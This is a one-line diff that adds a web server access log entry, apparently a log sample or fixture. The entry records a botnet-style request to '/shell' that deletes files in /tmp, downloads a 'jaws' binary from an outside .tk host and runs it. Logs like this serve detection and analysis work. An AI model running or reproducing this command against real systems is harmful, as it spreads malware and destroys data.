@@ -1,0 +1,1 @@
+46.12.240.194 - - [24/Mar/2020:01:20:03 +0200] "GET /shell?cd+/tmp;rm+-rf+*;wget+http://ZEROTERWWGFBOT.hoesbigmadzero.tk/jaws;sh+/tmp/jaws HTTP/1.1" 301 162 "-" "-" "Hello, world"
